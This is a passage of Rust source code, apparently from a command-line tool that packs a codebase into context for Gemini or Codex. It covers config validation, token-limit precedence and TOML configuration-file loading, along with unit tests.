        // This prevents user confusion by failing early with a clear error message
        if self.repo.is_some() && self.paths.is_some() {
            return Err(ContextCreatorError::InvalidConfiguration(
                "Cannot specify both --repo and local paths. Use --repo to analyze a remote repository, or provide local paths to analyze local directories.".to_string(),
            ));
        }

        Ok(())
    }

    /// Load configuration from file if specified
    pub fn load_from_file(&mut self) -> Result<(), crate::utils::error::ContextCreatorError> {
        use crate::config::ConfigFile;

        let config_file = if let Some(ref config_path) = self.config {
            // Load from specified config file
            Some(ConfigFile::load_from_file(config_path)?)
        } else {
            // Try to load from default locations
            ConfigFile::load_default()?
        };

        if let Some(config_file) = config_file {
            // Store custom priorities for the walker
            self.custom_priorities = config_file.priorities.clone();

            // Store token limits for token resolution
            self.config_token_limits = Some(config_file.tokens.clone());

            config_file.apply_to_cli_config(self);

            if self.verbose {
                if let Some(ref config_path) = self.config {
                    eprintln!("ðŸ“„ Loaded configuration from: {}", config_path.display());
                } else {
                    eprintln!("ðŸ“„ Loaded configuration from default location");
                }
            }
        }

        Ok(())
    }

    /// Get the prompt from the explicit prompt flag
    pub fn get_prompt(&self) -> Option<String> {
        self.prompt
            .as_ref()
            .filter(|s| !s.trim().is_empty())
            .cloned()
    }

    /// Get all directories from paths argument
    /// When using --include patterns, this returns the default directory (current dir)
    /// unless explicit paths are also provided (flexible combinations)
    pub fn get_directories(&self) -> Vec<PathBuf> {
        // If explicit paths are provided, use them
        if let Some(paths) = &self.paths {
            paths.clone()
        } else if self.include.is_some() {
            // When using include patterns without explicit paths, use current directory as base
            vec![PathBuf::from(".")]
        } else {
            // Default to current directory
            vec![PathBuf::from(".")]
        }
    }

    /// Get include patterns if specified
    pub fn get_include_patterns(&self) -> Vec<String> {
        self.include.as_ref().cloned().unwrap_or_default()
    }

    /// Get ignore patterns if specified
    pub fn get_ignore_patterns(&self) -> Vec<String> {
        self.ignore.as_ref().cloned().unwrap_or_default()
    }

    /// Get effective max tokens with precedence: explicit CLI > token limits (if prompt) > config defaults > hard-coded defaults (if prompt) > None
    pub fn get_effective_max_tokens(&self) -> Option<usize> {
        // 1. Explicit CLI value always takes precedence
        if let Some(explicit_tokens) = self.max_tokens {
            return Some(explicit_tokens);
        }

        // 2. If using prompt, check token limits from config first
        if let Some(_prompt) = self.get_prompt() {
            // Check if we have config token limits for this tool
            if let Some(token_limits) = &self.config_token_limits {
                let config_limit = match self.llm_tool {
                    LlmTool::Gemini => token_limits.gemini,
                    LlmTool::Codex => token_limits.codex,
                };

                if let Some(limit) = config_limit {
                    return Some(limit);
                }
            }

            // 3. Fall back to config defaults if available
            if let Some(defaults_tokens) = self.config_defaults_max_tokens {
                return Some(defaults_tokens);
            }

            // 4. Fall back to hard-coded defaults for prompts
            return Some(self.llm_tool.default_max_tokens());
        }

        // 5. For non-prompt usage, check config defaults
        if let Some(defaults_tokens) = self.config_defaults_max_tokens {
            return Some(defaults_tokens);
        }

        // 6. No automatic token limits for non-prompt usage
        None
    }

    /// Get effective context tokens with prompt reservation
    /// This accounts for prompt tokens when calculating available space for codebase context
    pub fn get_effective_context_tokens(&self) -> Option<usize> {
        if let Some(max_tokens) = self.get_effective_max_tokens() {
            if let Some(prompt) = self.get_prompt() {
                // Create token counter to measure prompt
                if let Ok(counter) = crate::core::token::TokenCounter::new() {
                    if let Ok(prompt_tokens) = counter.count_tokens(&prompt) {
                        // Reserve space for prompt + safety buffer for response
                        let safety_buffer = 1000; // Reserve for LLM response
                        let reserved = prompt_tokens + safety_buffer;
                        let available = max_tokens.saturating_sub(reserved);
                        return Some(available);
                    }
                }
                // Fallback: rough estimation if tiktoken fails
                let estimated_prompt_tokens = prompt.len().div_ceil(4); // ~4 chars per token
                let safety_buffer = 1000;
                let reserved = estimated_prompt_tokens + safety_buffer;
                let available = max_tokens.saturating_sub(reserved);
                Some(available)
            } else {
                // No prompt, use full token budget
                Some(max_tokens)
            }
        } else {
            None
        }
    }

    /// Check if we should read from stdin
    pub fn should_read_stdin(&self) -> bool {
        use std::io::IsTerminal;

        // Explicitly requested stdin
        if self.read_stdin {
            return true;
        }

        // If stdin is not a terminal (i.e., it's piped) and no prompt is provided
        if !std::io::stdin().is_terminal() && self.get_prompt().is_none() {
            return true;
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    impl Config {
        /// Helper function for creating Config instances in tests
        #[allow(dead_code)]
        fn new_for_test(paths: Option<Vec<PathBuf>>) -> Self {
            Self {
                paths,
                quiet: true, // Good default for tests
                ..Self::default()
            }
        }

        /// Helper function for creating Config instances with include patterns in tests
        #[allow(dead_code)]
        fn new_for_test_with_include(include: Option<Vec<String>>) -> Self {
            Self {
                include,
                quiet: true, // Good default for tests
                ..Self::default()
            }
        }
    }

    #[test]
    fn test_config_validation_valid_directory() {
        let temp_dir = TempDir::new().unwrap();
        let config = Config {
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            ..Default::default()
        };

        assert!(config.validate().is_ok());
    }

    #[test]
    fn test_config_validation_invalid_directory() {
        let config = Config {
            prompt: None,
            paths: Some(vec![PathBuf::from("/nonexistent/directory")]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        assert!(config.validate().is_err());
    }

    #[test]
    fn test_config_validation_file_as_directory() {
        let temp_dir = TempDir::new().unwrap();
        let file_path = temp_dir.path().join("file.txt");
        fs::write(&file_path, "test").unwrap();

        let config = Config {
            prompt: None,
            paths: Some(vec![file_path]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        assert!(config.validate().is_err());
    }

    #[test]
    fn test_config_validation_invalid_output_directory() {
        let temp_dir = TempDir::new().unwrap();
        let config = Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: Some(PathBuf::from("/nonexistent/directory/output.md")),
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        assert!(config.validate().is_err());
    }

    #[test]
    fn test_config_validation_mutually_exclusive_options() {
        let temp_dir = TempDir::new().unwrap();
        let config = Config {
            prompt: Some("test prompt".to_string()),
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: Some(temp_dir.path().join("output.md")),
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        assert!(config.validate().is_err());
    }

    #[test]
    fn test_llm_tool_enum_values() {
        assert_eq!(LlmTool::Gemini.command(), "gemini");
        assert_eq!(LlmTool::Codex.command(), "codex");

        assert!(LlmTool::Gemini
            .install_instructions()
            .contains("pip install"));
        assert!(LlmTool::Codex.install_instructions().contains("github.com"));

        assert_eq!(LlmTool::default(), LlmTool::Gemini);
    }

    #[test]
    fn test_llm_tool_default_max_tokens() {
        assert_eq!(LlmTool::Gemini.default_max_tokens(), 1_000_000);
        assert_eq!(LlmTool::Codex.default_max_tokens(), 1_000_000);
    }

    #[test]
    fn test_config_get_effective_max_tokens_with_explicit() {
        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: Some(500_000),
            llm_tool: LlmTool::Gemini,
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(500_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_with_prompt_default() {
        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: None,
            llm_tool: LlmTool::Gemini,
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(1_000_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_no_prompt() {
        let config = Config {
            prompt: None,
            max_tokens: None,
            llm_tool: LlmTool::Gemini,
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), None);
    }

    #[test]
    fn test_config_get_effective_max_tokens_with_config_gemini() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: None,
            llm_tool: LlmTool::Gemini,
            config_token_limits: Some(TokenLimits {
                gemini: Some(2_500_000),
                codex: Some(1_800_000),
            }),
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(2_500_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_with_config_codex() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: None,
            llm_tool: LlmTool::Codex,
            config_token_limits: Some(TokenLimits {
                gemini: Some(2_500_000),
                codex: Some(1_800_000),
            }),
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(1_800_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_explicit_overrides_config() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: Some(500_000), // Explicit value should override config
            llm_tool: LlmTool::Gemini,
            config_token_limits: Some(TokenLimits {
                gemini: Some(2_500_000),
                codex: Some(1_800_000),
            }),
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(500_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_config_partial_gemini() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: None,
            llm_tool: LlmTool::Gemini,
            config_token_limits: Some(TokenLimits {
                gemini: Some(3_000_000),
                codex: None, // Codex not configured
            }),
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(3_000_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_config_partial_codex() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: None,
            llm_tool: LlmTool::Codex,
            config_token_limits: Some(TokenLimits {
                gemini: None, // Gemini not configured
                codex: Some(1_200_000),
            }),
            ..Config::new_for_test(None)
        };
        assert_eq!(config.get_effective_max_tokens(), Some(1_200_000));
    }

    #[test]
    fn test_config_get_effective_max_tokens_config_fallback_to_default() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("test prompt".to_string()),
            max_tokens: None,
            llm_tool: LlmTool::Gemini,
            config_token_limits: Some(TokenLimits {
                gemini: None, // No limit configured for Gemini
                codex: Some(1_800_000),
            }),
            ..Config::new_for_test(None)
        };
        // Should fall back to hard-coded default
        assert_eq!(config.get_effective_max_tokens(), Some(1_000_000));
    }

    #[test]
    fn test_llm_tool_default_max_tokens_with_config() {
        use crate::config::TokenLimits;

        let token_limits = TokenLimits {
            gemini: Some(2_500_000),
            codex: Some(1_800_000),
        };

        assert_eq!(
            LlmTool::Gemini.default_max_tokens_with_config(Some(&token_limits)),
            2_500_000
        );
        assert_eq!(
            LlmTool::Codex.default_max_tokens_with_config(Some(&token_limits)),
            1_800_000
        );
    }

    #[test]
    fn test_llm_tool_default_max_tokens_with_config_partial() {
        use crate::config::TokenLimits;

        let token_limits = TokenLimits {
            gemini: Some(3_000_000),
            codex: None, // Codex not configured
        };

        assert_eq!(
            LlmTool::Gemini.default_max_tokens_with_config(Some(&token_limits)),
            3_000_000
        );
        // Should fall back to hard-coded default
        assert_eq!(
            LlmTool::Codex.default_max_tokens_with_config(Some(&token_limits)),
            1_000_000
        );
    }

    #[test]
    fn test_llm_tool_default_max_tokens_with_no_config() {
        assert_eq!(
            LlmTool::Gemini.default_max_tokens_with_config(None),
            1_000_000
        );
        assert_eq!(
            LlmTool::Codex.default_max_tokens_with_config(None),
            1_000_000
        );
    }

    #[test]
    fn test_get_effective_context_tokens_with_prompt() {
        let config = Config {
            prompt: Some("This is a test prompt".to_string()),
            max_tokens: Some(10000),
            llm_tool: LlmTool::Gemini,
            ..Config::new_for_test(None)
        };

        let context_tokens = config.get_effective_context_tokens().unwrap();
        // Should be less than max_tokens due to prompt + safety buffer reservation
        assert!(context_tokens < 10000);
        // Should be at least max_tokens - 1000 (safety buffer) - prompt tokens
        assert!(context_tokens > 8000); // Conservative estimate
    }

    #[test]
    fn test_get_effective_context_tokens_no_prompt() {
        let config = Config {
            prompt: None,
            max_tokens: Some(10000),
            llm_tool: LlmTool::Gemini,
            ..Config::new_for_test(None)
        };

        // Without prompt, should use full token budget
        assert_eq!(config.get_effective_context_tokens(), Some(10000));
    }

    #[test]
    fn test_get_effective_context_tokens_no_limit() {
        let config = Config {
            prompt: None, // No prompt means no auto-limits
            max_tokens: None,
            llm_tool: LlmTool::Gemini,
            ..Config::new_for_test(None)
        };

        // No max tokens configured and no prompt, should return None
        assert_eq!(config.get_effective_context_tokens(), None);
    }

    #[test]
    fn test_get_effective_context_tokens_with_config_limits() {
        use crate::config::TokenLimits;

        let config = Config {
            prompt: Some("This is a longer test prompt for token counting".to_string()),
            max_tokens: None, // Use config limits instead
            llm_tool: LlmTool::Gemini,
            config_token_limits: Some(TokenLimits {
                gemini: Some(50000),
                codex: Some(40000),
            }),
            ..Config::new_for_test(None)
        };

        let context_tokens = config.get_effective_context_tokens().unwrap();
        // Should be less than config limit due to prompt reservation
        assert!(context_tokens < 50000);
        assert!(context_tokens > 45000); // Should be most of the budget
    }

    #[test]
    fn test_config_validation_output_file_in_current_dir() {
        let temp_dir = TempDir::new().unwrap();
        let config = Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: Some(PathBuf::from("output.md")),
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        // Should not error for files in current directory
        assert!(config.validate().is_ok());
    }

    #[test]
    fn test_config_load_from_file_no_config() {
        let temp_dir = TempDir::new().unwrap();
        let mut config = Config {
            prompt: None,
            paths: Some(vec![temp_dir.path().to_path_buf()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        // Should not error when no config file is found
        assert!(config.load_from_file().is_ok());
    }

    #[test]
    fn test_parse_directories() {
        use clap::Parser;

        // Test single directory
        let args = vec!["context-creator", "/path/one"];
        let config = Config::parse_from(args);
        assert_eq!(config.paths.as_ref().unwrap().len(), 1);
        assert_eq!(
            config.paths.as_ref().unwrap()[0],
            PathBuf::from("/path/one")
        );
    }

    #[test]
    fn test_parse_multiple_directories() {
        use clap::Parser;

        // Test multiple directories
        let args = vec!["context-creator", "/path/one", "/path/two", "/path/three"];
        let config = Config::parse_from(args);
        assert_eq!(config.paths.as_ref().unwrap().len(), 3);
        assert_eq!(
            config.paths.as_ref().unwrap()[0],
            PathBuf::from("/path/one")
        );
        assert_eq!(
            config.paths.as_ref().unwrap()[1],
            PathBuf::from("/path/two")
        );
        assert_eq!(
            config.paths.as_ref().unwrap()[2],
            PathBuf::from("/path/three")
        );

        // Test with explicit prompt
        let args = vec!["context-creator", "--prompt", "Find duplicated patterns"];
        let config = Config::parse_from(args);
        assert_eq!(config.prompt, Some("Find duplicated patterns".to_string()));
    }

    #[test]
    fn test_validate_multiple_directories() {
        let temp_dir = TempDir::new().unwrap();
        let dir1 = temp_dir.path().join("dir1");
        let dir2 = temp_dir.path().join("dir2");
        fs::create_dir(&dir1).unwrap();
        fs::create_dir(&dir2).unwrap();

        // All directories exist - should succeed
        let config = Config {
            prompt: None,
            paths: Some(vec![dir1.clone(), dir2.clone()]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        assert!(config.validate().is_ok());

        // One directory doesn't exist - should fail
        let config = Config {
            prompt: None,
            paths: Some(vec![dir1, PathBuf::from("/nonexistent/dir")]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        assert!(config.validate().is_err());
    }

    #[test]
    fn test_validate_files_as_directories() {
        let temp_dir = TempDir::new().unwrap();
        let dir1 = temp_dir.path().join("dir1");
        let file1 = temp_dir.path().join("file.txt");
        fs::create_dir(&dir1).unwrap();
        fs::write(&file1, "test content").unwrap();

        // Mix of directory and file - should fail
        let config = Config {
            prompt: None,
            paths: Some(vec![dir1, file1]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 2,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };
        assert!(config.validate().is_err());
    }
}
```

## src/config.rs

Imports: crate, crate::utils::error::ContextCreatorError, serde, std, tests, super::*, std::fs, tempfile::TempDir

Imported by: debug_include_types.rs, utils.py, lib.rs, cli.rs, context_builder.rs, file_expander.rs, mod.rs, semantic_graph.rs, walker.rs, lib.rs, cli_combinations_test.rs, cli_flexibility_test.rs, cli_repo_paths_bug_test.rs, cli_uncovered_scenarios_test.rs, config_precedence_test.rs, debug_include_types_test.rs, ignore_patterns_test.rs, prompt_token_reservation_test.rs, semantic_analysis_test.rs, semantic_comprehensive_test.rs, semantic_include_types_integration_test.rs, semantic_include_types_simple_test.rs, semantic_include_types_test.rs, semantic_test_helpers.rs, token_limits_integration_test.rs

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, ConfigFile, Defaults, Defaults, Priority, TokenLimits, TokenLimits, Defaults, std.PathBuf, std.PathBuf, Priority, TokenLimits, ConfigFile, std.Path, std.Path, Self, crate::utils::error::ContextCreatorError.ContextCreatorError, ConfigFile, Self, crate::utils::error::ContextCreatorError.ContextCreatorError, CliConfig, CliConfig, ConfigFile, Defaults, TokenLimits, fs, tempfile::TempDir.TempDir, ConfigFile, ConfigFile, Defaults, CliConfig, ConfigFile, ConfigFile, ConfigFile, ConfigFile, Defaults, TokenLimits, CliConfig

```rust
//! Configuration file support for context-creator
//!
//! This module handles loading and parsing configuration files in TOML format.
//! Configuration files can specify defaults for CLI options and additional
//! settings like file priorities and ignore patterns.

use crate::cli::{Config as CliConfig, LlmTool};
use crate::utils::error::ContextCreatorError;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// Configuration file structure
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ConfigFile {
    /// Default settings
    #[serde(default)]
    pub defaults: Defaults,

    /// File priority configurations
    #[serde(default)]
    pub priorities: Vec<Priority>,

    /// Ignore patterns beyond .gitignore and .context-creator-ignore
    #[serde(default)]
    pub ignore: Vec<String>,

    /// Include patterns to force inclusion
    #[serde(default)]
    pub include: Vec<String>,

    /// Token limits for different LLM tools
    #[serde(default)]
    pub tokens: TokenLimits,
}

/// Default configuration settings
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Defaults {
    /// Default maximum tokens
    pub max_tokens: Option<usize>,

    /// Default LLM tool
    #[serde(default)]
    pub llm_tool: Option<String>,

    /// Default to show progress
    #[serde(default)]
    pub progress: bool,

    /// Default verbosity
    #[serde(default)]
    pub verbose: bool,

    /// Default quiet mode
    #[serde(default)]
    pub quiet: bool,

    /// Default directory
    pub directory: Option<PathBuf>,

    /// Default output file
    pub output_file: Option<PathBuf>,
}

/// File priority configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Priority {
    /// Glob pattern to match files
    pub pattern: String,
    /// Priority weight (higher = more important)
    pub weight: f32,
}

/// Token limits configuration for different LLM tools
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct TokenLimits {
    /// Maximum tokens for Gemini
    pub gemini: Option<usize>,
    /// Maximum tokens for Codex
    pub codex: Option<usize>,
}

impl ConfigFile {
    /// Load configuration from a file
    pub fn load_from_file(path: &Path) -> Result<Self, ContextCreatorError> {
        if !path.exists() {
            return Err(ContextCreatorError::InvalidPath(format!(
                "Configuration file does not exist: {}",
                path.display()
            )));
        }

        let content = std::fs::read_to_string(path).map_err(|e| {
            ContextCreatorError::ConfigError(format!(
                "Failed to read config file {}: {}",
                path.display(),
                e
            ))
        })?;

        let config: ConfigFile = toml::from_str(&content).map_err(|e| {
            ContextCreatorError::ConfigError(format!(
                "Failed to parse config file {}: {}",
                path.display(),
                e
            ))
        })?;

        Ok(config)
    }

    /// Load configuration from default locations
    pub fn load_default() -> Result<Option<Self>, ContextCreatorError> {
        // Try .context-creator.toml in current directory
        let local_config = Path::new(".context-creator.toml");
        if local_config.exists() {
            return Ok(Some(Self::load_from_file(local_config)?));
        }

        // Try .contextrc.toml in current directory
        let rc_config = Path::new(".contextrc.toml");
        if rc_config.exists() {
            return Ok(Some(Self::load_from_file(rc_config)?));
        }

        // Try in home directory
        if let Some(home) = dirs::home_dir() {
            let home_config = home.join(".context-creator.toml");
            if home_config.exists() {
                return Ok(Some(Self::load_from_file(&home_config)?));
            }
        }

        Ok(None)
    }

    /// Apply configuration defaults to CLI config
    pub fn apply_to_cli_config(&self, cli_config: &mut CliConfig) {
        // Apply custom priorities from config file
        cli_config.custom_priorities = self.priorities.clone();

        // Apply token limits from config file
        cli_config.config_token_limits = Some(self.tokens.clone());

        // Store defaults.max_tokens separately to distinguish from explicit CLI values
        if cli_config.max_tokens.is_none() && self.defaults.max_tokens.is_some() {
            cli_config.config_defaults_max_tokens = self.defaults.max_tokens;
        }

        if let Some(ref tool_str) = self.defaults.llm_tool {
            // Only apply if CLI used default
            if cli_config.llm_tool == LlmTool::default() {
                match tool_str.as_str() {
                    "gemini" => cli_config.llm_tool = LlmTool::Gemini,
                    "codex" => cli_config.llm_tool = LlmTool::Codex,
                    _ => {} // Ignore invalid tool names
                }
            }
        }

        // Apply boolean defaults only if they weren't explicitly set
        if !cli_config.progress && self.defaults.progress {
            cli_config.progress = self.defaults.progress;
        }

        if !cli_config.verbose && self.defaults.verbose {
            cli_config.verbose = self.defaults.verbose;
        }

        if !cli_config.quiet && self.defaults.quiet {
            cli_config.quiet = self.defaults.quiet;
        }

        // Apply directory default if CLI used default (".") AND no repo is specified
        // This prevents conflict with --repo validation
        let current_paths = cli_config.get_directories();
        if current_paths.len() == 1
            && current_paths[0] == PathBuf::from(".")
            && self.defaults.directory.is_some()
            && cli_config.repo.is_none()
        {
            cli_config.paths = Some(vec![self.defaults.directory.clone().unwrap()]);
        }

        // Apply output file default if not specified
        if cli_config.output_file.is_none() && self.defaults.output_file.is_some() {
            cli_config.output_file = self.defaults.output_file.clone();
        }

        // Apply ignore patterns from config file if no CLI ignore patterns provided
        // CLI ignore patterns always take precedence over config file patterns
        if cli_config.ignore.is_none() && !self.ignore.is_empty() {
            cli_config.ignore = Some(self.ignore.clone());
        }

        // Apply include patterns from config file if no CLI include patterns provided
        // CLI include patterns always take precedence over config file patterns
        if cli_config.include.is_none() && !self.include.is_empty() {
            cli_config.include = Some(self.include.clone());
        }
    }
}

/// Create an example configuration file
pub fn create_example_config() -> String {
    let example = ConfigFile {
        defaults: Defaults {
            max_tokens: Some(150000),
            llm_tool: Some("gemini".to_string()),
            progress: true,
            verbose: false,
            quiet: false,
            directory: None,
            output_file: None,
        },
        tokens: TokenLimits {
            gemini: Some(2_000_000),
            codex: Some(1_500_000),
        },
        priorities: vec![
            Priority {
                pattern: "src/**/*.rs".to_string(),
                weight: 100.0,
            },
            Priority {
                pattern: "src/main.rs".to_string(),
                weight: 150.0,
            },
            Priority {
                pattern: "tests/**/*.rs".to_string(),
                weight: 50.0,
            },
            Priority {
                pattern: "docs/**/*.md".to_string(),
                weight: 30.0,
            },
            Priority {
                pattern: "*.toml".to_string(),
                weight: 80.0,
            },
            Priority {
                pattern: "*.json".to_string(),
                weight: 60.0,
            },
        ],
        ignore: vec![
            "target/**".to_string(),
            "node_modules/**".to_string(),
            "*.pyc".to_string(),
            ".env".to_string(),
        ],
        include: vec!["!important/**".to_string()],
    };

    toml::to_string_pretty(&example)
        .unwrap_or_else(|_| "# Failed to generate example config".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_config_file_parsing() {
        let config_content = r#"
ignore = [
    "target/**",
    "node_modules/**"
]

include = [
    "!important/**"
]

[defaults]
max_tokens = 100000
llm_tool = "gemini"
progress = true

[[priorities]]
pattern = "src/**/*.rs"
weight = 100.0

[[priorities]]
pattern = "tests/**/*.rs"
weight = 50.0
"#;

        let config: ConfigFile = toml::from_str(config_content).unwrap();

        assert_eq!(config.defaults.max_tokens, Some(100000));
        assert_eq!(config.defaults.llm_tool, Some("gemini".to_string()));
        assert!(config.defaults.progress);
        assert_eq!(config.priorities.len(), 2);
        assert_eq!(config.priorities[0].pattern, "src/**/*.rs");
        assert_eq!(config.priorities[0].weight, 100.0);
        assert_eq!(config.ignore.len(), 2);
        assert_eq!(config.include.len(), 1);
    }

    #[test]
    fn test_config_file_loading() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join("config.toml");

        let config_content = r#"
[defaults]
max_tokens = 50000
progress = true
"#;

        fs::write(&config_path, config_content).unwrap();

        let config = ConfigFile::load_from_file(&config_path).unwrap();
        assert_eq!(config.defaults.max_tokens, Some(50000));
        assert!(config.defaults.progress);
    }

    #[test]
    fn test_apply_to_cli_config() {
        let config_file = ConfigFile {
            defaults: Defaults {
                max_tokens: Some(75000),
                llm_tool: Some("codex".to_string()),
                progress: true,
                verbose: true,
                quiet: false,
                directory: Some(PathBuf::from("/tmp")),
                output_file: Some(PathBuf::from("output.md")),
            },
            tokens: TokenLimits::default(),
            priorities: vec![],
            ignore: vec![],
            include: vec![],
        };

        let mut cli_config = CliConfig {
            prompt: None,
            paths: Some(vec![PathBuf::from(".")]),
            include: None,
            ignore: None,
            repo: None,
            read_stdin: false,
            output_file: None,
            max_tokens: None,
            llm_tool: LlmTool::default(),
            quiet: false,
            verbose: false,
            config: None,
            progress: false,
            copy: false,
            enhanced_context: false,
            trace_imports: false,
            include_callers: false,
            include_types: false,
            semantic_depth: 3,
            custom_priorities: vec![],
            config_token_limits: None,
            config_defaults_max_tokens: None,
        };

        config_file.apply_to_cli_config(&mut cli_config);

        assert_eq!(cli_config.config_defaults_max_tokens, Some(75000));
        assert_eq!(cli_config.llm_tool, LlmTool::Codex);
        assert!(cli_config.progress);
        assert!(cli_config.verbose);
        assert_eq!(cli_config.get_directories(), vec![PathBuf::from("/tmp")]);
        assert_eq!(cli_config.output_file, Some(PathBuf::from("output.md")));
    }

    #[test]
    fn test_example_config_generation() {
        let example = create_example_config();
        assert!(example.contains("[defaults]"));
        assert!(example.contains("max_tokens"));
        assert!(example.contains("[tokens]"));
        assert!(example.contains("gemini"));
        assert!(example.contains("codex"));
        assert!(example.contains("[[priorities]]"));
        assert!(example.contains("pattern"));
        assert!(example.contains("weight"));
    }

    #[test]
    fn test_token_limits_parsing() {
        let config_content = r#"
[tokens]
gemini = 2000000
codex = 1500000

[defaults]
max_tokens = 100000
"#;

        let config: ConfigFile = toml::from_str(config_content).unwrap();
        assert_eq!(config.tokens.gemini, Some(2_000_000));
        assert_eq!(config.tokens.codex, Some(1_500_000));
        assert_eq!(config.defaults.max_tokens, Some(100_000));
    }

    #[test]
    fn test_token_limits_partial_parsing() {
        let config_content = r#"
[tokens]
gemini = 3000000
# codex not specified, should use default

[defaults]
max_tokens = 150000
"#;

        let config: ConfigFile = toml::from_str(config_content).unwrap();
        assert_eq!(config.tokens.gemini, Some(3_000_000));
        assert_eq!(config.tokens.codex, None);
    }

    #[test]
    fn test_token_limits_empty_section() {
        let config_content = r#"
[tokens]
# No limits specified

[defaults]
max_tokens = 200000
"#;

        let config: ConfigFile = toml::from_str(config_content).unwrap();
        assert_eq!(config.tokens.gemini, None);
        assert_eq!(config.tokens.codex, None);
    }

    #[test]
    fn test_apply_to_cli_config_with_token_limits() {
